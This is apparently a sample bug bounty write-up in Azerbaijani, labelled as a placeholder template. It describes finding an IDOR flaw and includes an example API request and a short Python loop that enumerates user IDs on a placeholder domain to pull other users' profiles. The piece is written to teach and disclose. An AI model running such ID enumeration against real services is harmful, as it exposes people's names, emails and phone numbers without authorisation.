> Bu nümunə məqalədir. Öz writeup-ınızla əvəz edin.

## Giriş

Bug bounty-yə başlayanda ən çox eşitdiyim məsləhət bu idi: **"Sadə şeyləri yoxla."** Bu məqalədə ilk təsdiqlənmiş tapıntımı — bir IDOR (Insecure Direct Object Reference) zəifliyini — necə tapdığımı danışıram.

## Hədəfin araşdırılması

Tətbiqdə istifadəçi profili belə bir sorğu ilə yüklənirdi:

```http
GET /api/v1/users/10234/profile HTTP/1.1
Host: app.example.com
Authorization: Bearer eyJhbGciOi...
```

## Zəiflik

`10234` dəyərini `10235` ilə əvəz etdikdə server başqa istifadəçinin məlumatlarını qaytardı. Server tərəfində **sahiblik yoxlaması** yox idi.

```python
import requests

for uid in range(10230, 10240):
    r = requests.get(f"https://app.example.com/api/v1/users/{uid}/profile",
                     headers={"Authorization": "Bearer <TOKEN>"})
    print(uid, r.status_code)
```

## Təsir

| Məlumat | Açıq idi? |
|---|---|
| Ad, soyad | Bəli |
| E-poçt | Bəli |
| Telefon | Bəli |

## Bildiriş və nəticə

Zəifliyi proqramın qaydalarına uyğun bildirdim, 48 saat ərzində təsdiqləndi və düzəldildi.

## Öyrəndiklərim

- Hər ID parametrini yoxlayın
- Avtomatlaşdırmadan əvvəl əl ilə anlayın
- Hesabatı aydın və təkrarlana bilən yazın
